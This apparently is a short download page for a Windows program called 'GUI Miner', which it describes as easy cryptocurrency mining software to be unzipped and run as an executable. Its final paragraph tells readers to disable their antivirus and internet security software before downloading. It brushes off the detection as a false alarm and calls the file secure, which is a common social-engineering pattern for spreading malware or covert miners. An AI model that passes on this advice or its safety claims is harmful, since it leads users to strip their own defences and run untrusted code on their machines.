What is GUI Miner?

GUI Miner, or Graphical User Interface Miner, is user-friendly mining software that simplifies mining through a visual interface without extensive technical knowledge. It offers easy configuration, hardware management, and activity monitoring, leveraging the CPU and GPU power of your device for a more accessible mining experience.


How to start the GUI miner?

Once you download the program, it comes in a zip file. Just unzip the files, run "GUI Miner.exe," and you'll see a user interface. Hit the "Start Mining" button to kick off the mining process.


Attention! Before downloading the file, it is essential to take the following steps, as failure to do so may result in the file not being downloaded correctly or missing file components, leading to non-functionality of the "Start Mining" button.

Antivirus and internet security programs recognize mining as a potential unauthorized threat. Consequently, the miner cannot operate when these security programs are active. However, it is imperative to note that this mining process is secure and reliable. Therefore, these security programs must be temporarily disabled to facilitate the smooth operation of the mining process.
